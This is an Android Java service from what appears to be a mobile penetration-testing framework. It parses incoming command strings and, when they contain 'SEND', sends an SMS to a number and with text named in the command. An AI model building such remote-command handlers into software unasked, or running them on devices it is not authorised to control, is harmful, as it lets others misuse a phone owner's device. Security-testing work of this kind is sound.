package com.bulbsecurity.framework.app;



import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;


public class CommandHandler extends Service {
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		String body = intent.getStringExtra("message");
		String send = "SEND";

		
		if (body.length() >= 12)
		{
			
			String checkfunction = body.substring(8,12);
			if (checkfunction.equals(send))
			{
				String aString[] = body.split(" ");
				if (aString.length >= 4)
				{
					String number = aString[2];
					String message = aString[3];
					for (int j = 4; j < aString.length; j++)
					{
						message += " ";
						message += aString[j];
					}
					Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
					intent2.putExtra("number",number);
					intent2.putExtra("message",message);
					Context context = getApplicationContext();
					context.startService(intent2);
					
					
				}

				
			
		
			}
	}
		}
		

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
